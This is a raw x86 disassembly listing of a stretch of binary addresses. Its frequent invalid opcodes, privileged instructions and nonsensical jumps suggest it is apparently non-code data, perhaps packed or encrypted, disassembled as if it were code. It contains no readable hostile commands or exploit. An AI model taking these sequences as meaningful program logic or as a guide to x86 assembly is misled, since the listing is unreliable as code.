  4151f1:	mov    ds:0x59644029,eax
  4151f6:	xlat   BYTE PTR ds:[ebx]
  4151f7:	dec    edi
  4151f8:	ja     0x4151a4
  4151fa:	sbb    eax,0x425ff6a
  4151ff:	jle    0x41526f
  415201:	out    0xc8,al
  415203:	movd   edx,mm0
  415206:	bound  esi,QWORD PTR [ebp+0x26a9263e]
  41520c:	lea    edx,[ecx-0x19]
  41520f:	mov    ecx,DWORD PTR [ebx-0x1b]
  415212:	add    ecx,ebp
  415214:	add    edi,DWORD PTR [edx+0x32dd7ddf]
  41521a:	mov    dh,BYTE PTR [ebx-0x5a9d23d2]
  415220:	dec    BYTE PTR [ebx+0x411cf7d9]
  415226:	pop    esi
  415227:	into   
  415228:	push   0x71f26d76
  41522d:	add    eax,0x1eb834aa
  415232:	in     eax,dx
  415233:	sbb    edi,esp
  415235:	pop    esp
  415236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415237:	sbb    ah,dl
  415239:	pop    edi
  41523a:	dec    esp
  41523b:	push   ebp
  41523c:	xlat   BYTE PTR ds:[ebx]
  41523e:	xchg   DWORD PTR [ebx-0xc],esp
  415241:	dec    esp
	...
  4152b2:	add    BYTE PTR [eax],al
  4152b4:	add    DWORD PTR [ecx-0x2122293],eax
  4152ba:	mov    cl,0xdd
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	xchg   ebx,eax
  4152c1:	inc    esi
  4152c2:	xor    BYTE PTR [edi+0xe86e],ch
  4152c8:	test   BYTE PTR [eax],0x0
  4152cb:	add    bh,cl
  4152cd:	sbb    DWORD PTR [ebx-0x28],0x40
  4152d1:	ret    
  4152d2:	sahf   
  4152d3:	mov    bh,0x7d
  4152d5:	push   ebp
  4152d6:	xchg   esi,eax
  4152d7:	and    eax,0x8b9e45e2
  4152dc:	ins    DWORD PTR es:[edi],dx
  4152dd:	outs   dx,DWORD PTR ds:[esi]
  4152de:	or     cl,BYTE PTR [edx-0x5f95f79f]
  4152e4:	xchg   esi,eax
  4152e5:	(bad)  
  4152e6:	stc    
  4152e7:	bound  edx,QWORD PTR [esi]
  4152e9:	popf   
  4152ea:	mov    al,0x60
  4152ec:	mov    ebx,0x6be35895
  4152f1:	jno    0xef12d2e5
  4152f7:	test   eax,0x22165a46
  4152fc:	mov    esi,0xb706bdd9
  415301:	ror    BYTE PTR [edi+0x76],cl
  415304:	hlt    
  415305:	shl    BYTE PTR ds:0xa8f16056,1
  41530b:	nop
  41530c:	and    eax,0x4f992f44
  415311:	cdq    
  415312:	xchg   esp,eax
  415313:	jecxz  0x41530b
  415315:	pop    es
  415316:	xchg   esp,eax
  415317:	pop    ss
  415318:	xor    eax,0x9b7bc946
  41531d:	div    dh
  41531f:	sub    DWORD PTR [edx-0x5b],esi
  415322:	and    eax,0x60fc8a6e
  415327:	movaps xmm0,xmm0
  41532a:	sub    al,0x8b
  41532c:	mov    WORD PTR [ebp+0x3dab6075],gs
  415332:	loope  0x415376
  415334:	add    esi,DWORD PTR [ebx]
  415336:	clc    
  415337:	or     DWORD PTR [ecx],ebx
  415339:	pop    ecx
  41533a:	fst    DWORD PTR [ecx+0x170288a5]
  415340:	push   es
  415341:	sub    DWORD PTR [esi+0x76b24fc6],esi
  415347:	adc    cl,BYTE PTR [ebx]
  415349:	std    
  41534a:	xchg   edi,eax
  41534b:	pop    ds
  41534c:	imul   ecx,esi,0x52
  41534f:	fsub   st(2),st
  415351:	int    0xd3
  415353:	xchg   edi,eax
  415354:	sbb    ebp,eax
  415356:	fimul  WORD PTR [ebx+0x2f7fca5b]
  41535c:	mov    ebp,0x221bed13
  415361:	into   
  415362:	mov    esp,0x7fef06f1
  415367:	jmp    0x2c4a:0x4d7adbd6
  41536e:	(bad)  
  41536f:	push   esi
  415370:	jmp    0x6ad9bda7
  415375:	loope  0x415349
  415377:	inc    esp
  415378:	std    
  415379:	ja     0x41537c
  41537b:	cmc    
  41537c:	jle    0x41537b
  41537e:	dec    esp
  41537f:	es push ebx
  415381:	mov    dh,0xb4
  415383:	mov    ah,0xf3
  415385:	mov    eax,0xed44d62e
  41538a:	or     ebx,ecx
  41538c:	not    BYTE PTR [esp+eax*1]
  41538f:	stos   BYTE PTR es:[edi],al
  415390:	in     al,dx
  415391:	cmp    eax,0xd4bde574
  415396:	sub    eax,0x707b8073
  41539b:	or     al,0x61
  41539d:	xor    al,ch
  41539f:	sub    BYTE PTR [esi-0x22],cl
  4153a2:	xlat   BYTE PTR ds:[ebx]
  4153a3:	icebp  
  4153a4:	pop    edx
  4153a5:	sbb    ch,dl
  4153a7:	pop    esi
  4153a8:	(bad)  
  4153a9:	int3   
  4153aa:	cmp    eax,0x57bafab1
  4153af:	inc    ebp
  4153b0:	adc    al,BYTE PTR [edi+0x2d8dd0ea]
  4153b6:	pop    es
  4153b7:	jmp    0x4153a9
  4153b9:	inc    edx
  4153ba:	push   0x3cfbe8e2
  4153bf:	rol    DWORD PTR [ebx+0x3d],0x0
	...
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	mov    eax,ds:0x64abf847
  415445:	jmp    0x137544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	jge    0x41542b
  41544e:	inc    ebx
  41544f:	(bad)  
  415450:	xchg   edi,eax
  415451:	add    DWORD PTR cs:[edx-0x38],0x55
  415456:	loopne 0x4154a2
  415458:	out    0x5a,eax
  41545a:	ret    
  41545b:	push   edi
  41545c:	jp     0x4154dc
  41545e:	cli    
  41545f:	push   ebp
  415460:	es dec ecx
  415462:	cs add esi,edx
  415465:	nop
  415466:	cwde   
  415467:	xchg   ebx,eax
  415468:	adc    BYTE PTR [eax+0x39],bh
  41546b:	scas   al,BYTE PTR es:[edi]
  41546c:	out    0x4e,eax
  41546e:	push   esp
  41546f:	fdiv   st(3),st
  415471:	sbb    eax,0x459ddfbe
  415476:	es pop edi
  415478:	rol    DWORD PTR [edi],cl
  41547a:	jl     0x4153fd
  41547c:	dec    DWORD PTR [esi]
  41547e:	pop    ecx
  41547f:	and    eax,0xd2930c59
  415484:	cmc    
  415485:	or     cl,BYTE PTR [ebx+0x19]
  415488:	or     eax,0xdbb83b40
  41548d:	push   esi
  41548e:	mov    ah,0xab
  415490:	jno    0x4154e9
  415492:	sub    bl,ch
  415494:	mov    ebx,0x9d615fb7
  415499:	(bad)  
  41549a:	inc    ebp
  41549b:	leave  
  41549c:	push   cs
  41549d:	push   ss
  41549e:	pop    es
  41549f:	xlat   BYTE PTR ds:[ebx]
  4154a0:	push   edx
  4154a1:	in     eax,dx
  4154a2:	fidiv  WORD PTR [ebx+0x40]
  4154a5:	sub    DWORD PTR [edi],eax
  4154a7:	loope  0x4154b9
  4154a9:	aas    
  4154aa:	scas   eax,DWORD PTR es:[edi]
  4154ab:	int    0x59
  4154ad:	ret    
  4154ae:	test   eax,0xa85dd9a8
  4154b3:	jl     0x41552b
  4154b5:	call   0x1049969c
  4154ba:	pop    ss
  4154bb:	xor    DWORD PTR [ebx+ecx*1],0x183773b3
  4154c2:	adc    BYTE PTR [ebx+esi*2-0x69df8a11],0x8a
  4154ca:	xor    eax,edx
  4154cc:	sub    DWORD PTR [ebx],ebx
  4154ce:	add    eax,0x8731299f
  4154d3:	xchg   DWORD PTR [ecx+0x2ab1eea5],ebx
  4154d9:	call   DWORD PTR [edi+eax*1-0x3]
  4154dd:	pop    edx
  4154de:	cmp    esp,DWORD PTR [ebp-0xc]
  4154e1:	add    ebx,DWORD PTR [esi-0x76]
  4154e4:	sub    ch,BYTE PTR [esi+0x6c67ac5c]
  4154ea:	xor    DWORD PTR [ebx+0x37],ebp
  4154ed:	pusha  
  4154ee:	push   edi
  4154ef:	and    BYTE PTR [esi],ah
  4154f1:	sub    al,0xb0
  4154f3:	inc    edx
  4154f4:	sbb    al,0x72
  4154f6:	retf   0xbb5f
  4154f9:	addr16 cmc 
  4154fb:	jo     0x4154e5
  4154fd:	pop    esp
  4154fe:	push   eax
  4154ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415500:	dec    ebp
  415501:	mov    eax,0xb7fa1aba
  415506:	xchg   DWORD PTR [esi-0x4759028f],ecx
  41550c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41550d:	xchg   edi,eax
  41550e:	sbb    eax,0xf4b78c10
  415513:	jmp    0x41558a
  415515:	lahf   
  415516:	fnstsw WORD PTR [ebx+0x1f678405]
  41551c:	pop    esp
  41551d:	push   es
  41551e:	jecxz  0x4154ec
  415520:	rcl    BYTE PTR ds:0x60167227,cl
  415526:	cwde   
  415527:	call   0x256b709b
  41552c:	jns    0x415556
  41552e:	fcom   DWORD PTR [esi]
  415530:	(bad)  
  415531:	and    DWORD PTR [esi+0x2e2dd365],esp
  415537:	jbe    0x415517
  415539:	sbb    DWORD PTR ds:0x8387c651,ebx
  41553f:	xchg   ebp,eax
  415540:	loop   0x415541
	...
  4155b2:	add    BYTE PTR [eax],al
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	retf   0x59c8
  4155c3:	rcr    BYTE PTR [edx-0x16],cl
  4155c6:	add    BYTE PTR [eax],al
  4155c8:	test   BYTE PTR [eax],0x0
  4155cb:	add    BYTE PTR ds:0x69723200,al
  4155d1:	jno    0x41563a
  4155d3:	push   ebp
  4155d4:	mov    al,0xa3
  4155d6:	inc    edx
  4155d7:	das    
  4155d8:	xor    eax,0x874062ea
  4155dd:	lahf   
  4155de:	repnz cld 
  4155e0:	sub    eax,0x4f439799
  4155e5:	icebp  
  4155e6:	es pusha 
  4155e8:	in     al,dx
  4155e9:	sub    BYTE PTR [ebp+0x121a0186],ch
  4155ef:	sub    eax,0x95276f70
  4155f4:	les    ecx,FWORD PTR [ebx-0x4d78ef51]
  4155fa:	push   0x81512092
  4155ff:	adc    dl,BYTE PTR [ebp+0xf]
  415602:	inc    ecx
  415603:	inc    ecx
  415604:	ds mov ch,0x47
  415607:	cld    
  415608:	xchg   ecx,eax
  415609:	mov    WORD PTR [edi+eiz*1-0x6b2b091b],ss
  415610:	cs mov ah,0xd8
  415613:	pop    edx
  415614:	push   es
  415615:	ja     0x4155f7
  415617:	outs   dx,BYTE PTR ds:[esi]
  415618:	sbb    al,BYTE PTR [esi-0x7f616c60]
  41561e:	(bad)  
  41561f:	mov    bl,0x39
  415621:	inc    ecx
  415622:	sahf   
  415623:	test   BYTE PTR [edi],dh
  415625:	push   eax
  415626:	mov    cl,0xbe
  415628:	pusha  
  415629:	rcl    BYTE PTR [ebx],1
  41562b:	dec    eax
  41562c:	mov    edx,0x6d6a71a4
  415631:	mov    eax,0x8d6db5ac
  415636:	ror    BYTE PTR [ecx+0x46],0x18
  41563a:	dec    esp
  41563b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41563c:	push   ds
  41563d:	xchg   DWORD PTR [ebx-0x49779375],edi
  415643:	(bad)  
  415644:	jb     0x415601
  415646:	xor    BYTE PTR [edx],al
  415648:	mov    dh,0x61
  41564a:	pop    ds
  41564b:	push   ebp
  41564c:	jbe    0x415611
  41564e:	push   ss
  41564f:	add    al,0x94
  415651:	sbb    al,0x46
  415653:	adc    al,0xcc
  415655:	lahf   
  415656:	test   DWORD PTR [ebp+0x7c],ebp
  415659:	add    esp,DWORD PTR [eax+edi*8+0x2e29f703]
  415660:	ds xchg ebp,eax
  415662:	add    DWORD PTR [ecx+0xc300b16],esp
  415668:	es enter 0xafc0,0x3b
  41566d:	sub    dh,BYTE PTR [edi+ebp*1]
  415670:	int3   
  415671:	inc    esp
  415672:	pusha  
  415673:	out    dx,eax
  415674:	push   esi
  415675:	stc    
  415676:	or     BYTE PTR cs:[esi-0x12ca915d],bl
  41567d:	fadd   st(5),st
  41567f:	dec    esp
  415680:	(bad)  
  415681:	xor    eax,DWORD PTR [ecx-0x5f]
  415684:	adc    ecx,esi
  415686:	data16 fdivr st(4),st
  415689:	xchg   edx,eax
  41568a:	stos   BYTE PTR es:[edi],al
  41568b:	shl    BYTE PTR [eax+0x60],1
  41568e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41568f:	sub    ecx,DWORD PTR [edx-0x16]
  415692:	add    edi,DWORD PTR [eax+0x4ba4b920]
  415698:	mov    esp,0x2f78617d
  41569d:	pop    eax
  41569e:	call   0x92e524b1
  4156a3:	(bad)  
  4156a4:	cmp    al,0x11
  4156a6:	rcl    edi,cl
  4156a8:	int3   
  4156a9:	xchg   ebp,eax
  4156aa:	fcom   st(0)
  4156ac:	js     0x4156f1
  4156ae:	mov    ?,WORD PTR [ecx]
  4156b0:	xchg   ebp,eax
  4156b1:	jae    0x4156a3
  4156b3:	add    BYTE PTR [edx+0x64],bh
  4156b6:	inc    esi
  4156b7:	out    0x14,eax
  4156b9:	cmp    eax,0xb0e6cb75
  4156be:	jns    0x4156bc
  4156c0:	in     al,0xde
	...
  415732:	add    BYTE PTR [eax],al
  415734:	jle    0x415765
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0xaa0bfd3
  415743:	mov    ds:0xeb50,eax
  415748:	test   BYTE PTR [eax],0x0
  41574b:	add    ah,dh
  41574d:	lea    edi,[ebp-0x5c]
  415750:	xchg   ebp,eax
  415751:	jle    0x415719
  415753:	es mov cl,0x19
  415756:	push   0xbcc85ebc
  41575b:	inc    ebp
  41575c:	retf   
  41575d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41575e:	repz iret 
  415760:	inc    ebx
  415761:	cs or  BYTE PTR gs:[edx-0x6c],ch
  415766:	mov    WORD PTR [edi-0x33],?
  415769:	fwait
  41576a:	int    0x18
  41576c:	jbe    0x415713
  41576e:	ror    dl,cl
  415770:	push   edi
  415771:	push   eax
  415772:	dec    eax
  415773:	jne    0x41574f
  415775:	stc    
  415776:	lea    esp,[ecx]
  415778:	popf   
  415779:	loope  0x415764
  41577b:	inc    edx
  41577c:	inc    edi
  41577d:	pop    eax
  41577e:	pop    esi
  41577f:	jnp    0x4157c7
  415781:	or     eax,0xa8b5f12a
  415786:	test   al,0xc2
  415788:	in     eax,0xae
  41578a:	cmp    dh,dh
  41578c:	outs   dx,BYTE PTR ds:[esi]
  41578d:	and    DWORD PTR [eax],edx
  41578f:	or     eax,0x4eb041df
  415794:	xor    DWORD PTR [ecx+0x6f],ecx
  415797:	pop    ss
  415798:	mov    ds:0x2fc40cec,al
  41579d:	scas   eax,DWORD PTR es:[edi]
  41579e:	jnp    0x415734
  4157a0:	adc    BYTE PTR [eax-0x7],dh
  4157a3:	or     DWORD PTR [esi-0x3d],esp
  4157a6:	ret    0xbfca
  4157a9:	inc    esp
  4157aa:	cmp    esi,DWORD PTR [ebx-0x4a]
  4157ad:	push   cs
  4157ae:	mov    ?,WORD PTR [ecx+ecx*8]
  4157b1:	std    
  4157b2:	mov    DWORD PTR [ecx+0x411b0076],esi
  4157b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157b9:	cmp    cl,BYTE PTR [esi-0x7e]
  4157bc:	xor    BYTE PTR [edx+0xb],al
  4157bf:	inc    esp
  4157c0:	cmp    ebx,edx
  4157c2:	pop    ecx
  4157c3:	mov    esp,0x40d07473
  4157c8:	(bad)  
  4157c9:	data16 aas 
  4157cb:	jnp    0x415832
  4157cd:	enter  0x2e8a,0x41
  4157d1:	pop    ss
  4157d2:	sti    
  4157d3:	push   esi
  4157d4:	das    
  4157d5:	fsubrp st(2),st
  4157d7:	cld    
  4157d8:	nop
  4157d9:	pop    ds
  4157da:	pop    ss
  4157db:	pop    esi
  4157dc:	clc    
  4157dd:	clc    
  4157de:	test   eax,0x774c9de4
  4157e3:	add    edx,DWORD PTR [ebx-0x268d8f51]
  4157e9:	ret    0xd44d
  4157ec:	dec    ebp
  4157ed:	lods   al,BYTE PTR ds:[esi]
  4157ee:	std    
  4157ef:	test   eax,0xb344eb2
  4157f4:	inc    edi
  4157f5:	popa   
  4157f6:	mov    cs,WORD PTR [ebx]
  4157f8:	cdq    
  4157f9:	mov    cl,0x8c
  4157fb:	and    DWORD PTR es:[esi-0x38],0xffffff9a
  415800:	jmp    0xe997:0xa95fdb21
  415807:	pop    esp
  415808:	pusha  
  415809:	iret   
  41580a:	rcr    DWORD PTR [esp+ebp*1],1
  41580d:	mov    ds:0x46e9d58,al
  415812:	cmp    ebx,DWORD PTR [esi]
  415814:	pop    esi
  415815:	outs   dx,DWORD PTR ds:[esi]
  415816:	inc    ebp
  415817:	add    al,0x81
  415819:	mov    ds:0x55511188,eax
  41581e:	xchg   esi,eax
  41581f:	dec    ebx
  415820:	sub    BYTE PTR [ebp-0x1205cd37],0xb3
  415827:	or     DWORD PTR [edx+0x6d],edx
  41582a:	push   ecx
  41582b:	out    dx,al
  41582c:	push   cs
  41582d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41582e:	jle    0x415874
  415830:	add    bh,ch
  415832:	dec    ebx
  415833:	mov    edx,0xd83d1d9d
  415838:	jne    0x4158b7
  41583a:	push   es
  41583b:	cwde   
  41583c:	jl     0x4157c8
  41583e:	mov    cl,0x5d
  415840:	sbb    edx,eax
	...
  4158b2:	add    BYTE PTR [eax],al
  4158b4:	or     edi,DWORD PTR [esi-0x2e]
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0xf09dc4fe
  4158c3:	xchg   ecx,eax
  4158c4:	inc    esi
  4158c5:	in     al,dx
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	test   BYTE PTR [eax],0x0
  4158cb:	add    BYTE PTR [ebx+edx*2],ah
  4158ce:	iret   
  4158cf:	cmp    ah,BYTE PTR [esi]
  4158d1:	stc    
  4158d2:	sub    DWORD PTR [eax+0x3f],ebx
  4158d5:	(bad)  
  4158d6:	fild   DWORD PTR ds:0x8ab8ead7
  4158dc:	xchg   ecx,eax
  4158dd:	not    DWORD PTR [ecx+eax*4-0x5c05d9ac]
  4158e4:	ret    
  4158e5:	sbb    BYTE PTR [edx-0x57],bl
  4158e8:	pop    edi
  4158e9:	pop    esp
  4158ea:	dec    esi
  4158eb:	and    DWORD PTR [edx+0x6754c1e2],ebx
  4158f1:	fs xchg ebx,eax
  4158f3:	dec    eax
  4158f4:	fcomp  DWORD PTR [ebp-0x58]
  4158f7:	repnz popa 
  4158f9:	mov    edi,0x351738f3
  4158fe:	jmp    0x4158b9
  415900:	int    0x67
  415902:	mov    ch,0x6
  415904:	push   es
  415905:	fbld   TBYTE PTR [edx]
  415907:	mov    ebx,0xd01be330
  41590c:	jmp    0xca72:0xd7d3c5f5
  415913:	jg     0x415925
  415915:	and    DWORD PTR [ebp+0x1],ebp
  415918:	sbb    bh,bl
  41591a:	clc    
  41591b:	xor    bl,BYTE PTR [eax-0x7bd977e]
  415921:	sbb    ch,dl
  415923:	and    al,0x60
  415925:	cmc    
  415926:	cli    
  415927:	mov    dl,BYTE PTR [edi+0x7d079bc9]
  41592d:	mov    edx,0xdfe69bc1
  415932:	mov    esi,0x8519d5eb
  415937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415938:	inc    edi
  415939:	call   0x297d:0xa6a72fd6
  415940:	mov    eax,ds:0x4e041072
  415945:	inc    edx
  415946:	jmp    0x415978
  415948:	ja     0x4159c3
  41594a:	sub    eax,0xba8f0cd4
  41594f:	sub    esi,edx
  415951:	test   DWORD PTR [esi],edx
  415953:	xor    al,0xad
  415955:	(bad)  
  415956:	shl    DWORD PTR [eax-0x25],cl
  415959:	mov    dl,0x14
  41595b:	push   DWORD PTR [ecx-0x7e]
  41595e:	enter  0x1fe,0xdb
  415962:	add    eax,0x1dd4b268
  415967:	lahf   
  415968:	jmp    0x46d5ee7d
  41596d:	retf   
  41596e:	mov    eax,0x50fe9b4b
  415973:	sub    ebx,ebx
  415975:	fbld   TBYTE PTR [eax]
  415977:	enter  0xfbfc,0x76
  41597b:	imul   esp,DWORD PTR [edx+0x5a70a3f0],0xfffffffd
  415982:	push   ebp
  415983:	push   ds
  415984:	sti    
  415985:	(bad)  
  415986:	mov    dh,0x8c
  415988:	sub    BYTE PTR [edi-0x57],bl
  41598b:	xor    bh,BYTE PTR [esi+0x19fd520c]
  415991:	mov    eax,0x7b4e0f84
  415996:	pop    ecx
  415997:	inc    ecx
  415998:	add    BYTE PTR [ecx],bh
  41599a:	iret   
  41599b:	test   eax,0x36bfbf37
  4159a0:	mov    dl,0x3
  4159a2:	xchg   esp,eax
  4159a3:	adc    al,0x33
  4159a5:	mov    ch,0x57
  4159a7:	in     eax,dx
  4159a8:	jo     0x41594b
  4159aa:	and    al,0x10
  4159ac:	into   
  4159ad:	sub    ah,BYTE PTR [ecx+ebx*8-0x19aaca0d]
  4159b4:	mov    ecx,0xbe03690c
  4159b9:	push   ebx
  4159ba:	and    dh,BYTE PTR ds:[ebp+0x62]
  4159be:	mov    bh,0xb0
  4159c0:	ins    DWORD PTR es:[edi],dx
  4159c1:	adc    eax,DWORD PTR [eax]
	...
  415a33:	add    BYTE PTR [edi+0x7e363ed9],bl
  415a39:	neg    DWORD PTR [edi+0x4f7241f9]
  415a3f:	lahf   
  415a40:	xchg   edx,eax
  415a41:	cmp    bl,BYTE PTR [edx+0xed3cc6]
  415a47:	add    dh,dh
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [eax+0x2c0261ed],bh
  415a51:	xchg   ebx,eax
  415a52:	mov    eax,0xbe517d85
  415a57:	sub    BYTE PTR [esi-0x848f0b],cl
  415a5d:	push   cs
  415a5e:	mov    esp,0xe97facc4
  415a63:	jno    0x415acc
  415a65:	jp     0x415a11
  415a67:	cmp    eax,0xd9cde792
  415a6c:	sbb    esp,DWORD PTR [eax+0x1]
  415a6f:	dec    esp
  415a70:	jno    0x415aad
  415a72:	pop    es
  415a73:	inc    ebx
  415a74:	pop    edi
  415a75:	sub    al,dh
  415a77:	shl    BYTE PTR [eax],cl
  415a79:	mov    WORD PTR [eax],?
  415a7b:	in     eax,dx
  415a7c:	add    eax,ecx
  415a7e:	xor    al,0x12
  415a80:	and    DWORD PTR [ebx],esp
  415a82:	adc    dh,BYTE PTR [ecx+0x70fe39e]
  415a88:	ins    BYTE PTR es:[edi],dx
  415a89:	fimul  WORD PTR [eiz*4+0x246cf3fb]
  415a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a91:	and    BYTE PTR [ebx+ecx*2-0x4d],bl
  415a95:	enter  0xfb72,0x87
  415a99:	jg     0x415aaf
  415a9b:	pop    ebx
  415a9c:	into   
  415a9d:	mov    cl,0xf
  415a9f:	stos   BYTE PTR es:[edi],al
  415aa0:	test   ah,al
  415aa2:	adc    BYTE PTR [edi],ch
  415aa4:	dec    esi
  415aa5:	jo     0x415a5b
  415aa7:	pop    esi
  415aa8:	ret    
  415aa9:	(bad)  
  415aaa:	ja     0x415a64
  415aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aad:	and    eax,0xaa740459
  415ab2:	pop    es
  415ab3:	mov    edx,0x83ee4d43
  415ab8:	dec    ecx
  415ab9:	aam    0x52
  415abb:	sahf   
  415abc:	pop    es
  415abd:	pop    edx
  415abe:	stos   DWORD PTR es:[edi],eax
  415abf:	iret   
  415ac0:	mov    bl,0x34
  415ac2:	dec    esi
  415ac3:	arpl   cx,si
  415ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ac6:	and    al,0x96
  415ac8:	dec    eax
  415ac9:	inc    esi
  415aca:	pop    edi
  415acb:	daa    
  415acc:	jge    0x415b0f
  415ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415acf:	xchg   BYTE PTR [eax],ah
  415ad1:	sbb    edi,DWORD PTR [esp+edx*4]
  415ad4:	or     ebp,DWORD PTR ds:0x93b63890
  415ada:	xchg   esi,eax
  415adb:	jnp    0x415b51
  415add:	dec    esi
  415ade:	push   ebp
  415adf:	jp     0x415a92
  415ae1:	cmc    
  415ae2:	loope  0x415af9
  415ae4:	xchg   ecx,eax
  415ae5:	jecxz  0x415b44
  415ae7:	test   BYTE PTR [edx+0x1f35fddc],dh
  415aed:	push   es
  415aee:	add    DWORD PTR [ecx],esp
  415af0:	pop    ds
  415af1:	jg     0x415b3c
  415af3:	stc    
  415af4:	cld    
  415af5:	cwde   
  415af6:	outs   dx,BYTE PTR ds:[esi]
  415af7:	out    dx,al
  415af8:	and    al,0xd5
  415afa:	test   BYTE PTR [ebx+ecx*1-0x8],ch
  415afe:	(bad)  
  415aff:	stc    
  415b00:	or     ecx,DWORD PTR [edi-0x73]
  415b03:	test   esi,ebx
  415b05:	loope  0x415ae2
  415b07:	or     eax,0x35db7536
  415b0c:	mov    edx,0xa93717bf
  415b11:	out    dx,al
  415b12:	pusha  
  415b13:	jge    0x415b8d
  415b15:	push   edx
  415b16:	lds    edx,FWORD PTR [eax]
  415b18:	cmp    ah,BYTE PTR [edi+ebx*4+0x1d]
  415b1c:	shr    edi,1
  415b1e:	cwde   
  415b1f:	mov    edx,0x770c3ed3
  415b24:	(bad)  
  415b25:	push   edx
  415b26:	mov    ecx,0xdcc58348
  415b2b:	dec    esp
  415b2c:	shl    BYTE PTR [ecx-0x6e],cl
  415b2f:	xor    edx,DWORD PTR es:[ebx-0x34]
  415b33:	cmc    
  415b34:	aas    
  415b35:	sbb    edx,0x4c04b54b
  415b3b:	mov    edx,0x2605019e
  415b40:	loop   0x415b68
	...
  415bb2:	add    BYTE PTR [eax],al
  415bb4:	xor    al,0x64
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	leave  
  415bc1:	fisubr WORD PTR [ecx+0xee320d]
  415bc7:	add    dh,dh
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [ebx+eax*8],ch
  415bce:	addr16 jge 0x415b52
  415bd1:	push   edi
  415bd2:	imul   eax,DWORD PTR [esi-0x21],0x22478265
  415bd9:	fneni(8087 only) 
  415bdb:	arpl   WORD PTR [edx],sp
  415bdd:	cwde   
  415bde:	dec    edx
  415bdf:	loop   0x415c45
  415be1:	inc    esp
  415be2:	dec    esp
  415be3:	add    DWORD PTR [esp+ecx*4-0x6f],edx
  415be7:	adc    eax,eax
  415be9:	sbb    al,0xbb
  415beb:	dec    edi
  415bec:	jmp    0x415c69
  415bee:	cmp    BYTE PTR [edi+ebp*2-0x57ee3e5],0x66
  415bf6:	inc    ebp
  415bf7:	xchg   ecx,eax
  415bf8:	loope  0x415b8c
  415bfa:	inc    BYTE PTR [edi*1+0x61819135]
  415c01:	outs   dx,BYTE PTR ds:[esi]
  415c02:	mov    ss,ebp
  415c04:	cmp    ebx,esi
  415c06:	sbb    BYTE PTR [esi],cl
  415c08:	inc    ebx
  415c09:	push   ebx
  415c0a:	or     esp,eax
  415c0c:	sahf   
  415c0d:	mov    cs,WORD PTR [ebp-0x2c]
  415c10:	inc    ebp
  415c11:	and    eax,0xf90d7e29
  415c16:	dec    ecx
  415c17:	cld    
  415c18:	inc    eax
  415c19:	xor    BYTE PTR [ebp+0x35],bh
  415c1c:	aaa    
  415c1d:	inc    eax
  415c1e:	mov    DWORD PTR [edx-0x65a62cc7],0x65561332
  415c28:	fs (bad) 
  415c2a:	in     eax,0xc9
  415c2c:	call   0x10e2:0x84780570
  415c33:	xor    DWORD PTR [ecx],esp
  415c35:	hlt    
  415c36:	out    dx,al
  415c37:	scas   eax,DWORD PTR es:[edi]
  415c38:	lods   eax,DWORD PTR ds:[esi]
  415c39:	dec    eax
  415c3a:	xor    cl,BYTE PTR [ebp+eiz*2+0x6ac9f38a]
  415c41:	sbb    eax,0x1dcc5310
  415c46:	int3   
  415c47:	vmovntps XMMWORD PTR [edx+0x2],xmm7
  415c4c:	fidivr DWORD PTR ds:0xd6898362
  415c52:	jg     0x415c51
  415c54:	and    ebp,DWORD PTR [edi]
  415c56:	fcmovnb st,st(5)
  415c58:	rcr    ecx,cl
  415c5a:	mov    edx,0xe065d3ec
  415c5f:	arpl   sp,ax
  415c61:	and    ah,BYTE PTR [edi+0x31]
  415c64:	fcmovb st,st(0)
  415c66:	dec    ecx
  415c67:	mov    eax,edx
  415c69:	aad    0x74
  415c6b:	cmc    
  415c6c:	mov    WORD PTR [ecx],es
  415c6e:	cmp    cl,BYTE PTR [ebp+eiz*4+0x2ffcadc1]
  415c75:	shl    DWORD PTR ds:0xbfe83b0b,0xa6
  415c7c:	js     0x415ce7
  415c7e:	mov    DWORD PTR [eax],edi
  415c80:	mov    al,0xfb
  415c82:	xor    BYTE PTR [edi+0x5f],0xd7
  415c86:	loop   0x415c83
  415c88:	jge    0x415ccd
  415c8a:	jmp    0x5b4bfa7c
  415c8f:	stos   BYTE PTR es:[edi],al
  415c90:	xchg   ebx,eax
  415c91:	fnstcw WORD PTR [edx]
  415c93:	or     esi,esi
  415c95:	(bad)  
  415c96:	sbb    DWORD PTR ds:0x1bbd4d0c,esp
  415c9c:	aad    0xcc
  415c9e:	push   ds
  415c9f:	push   esi
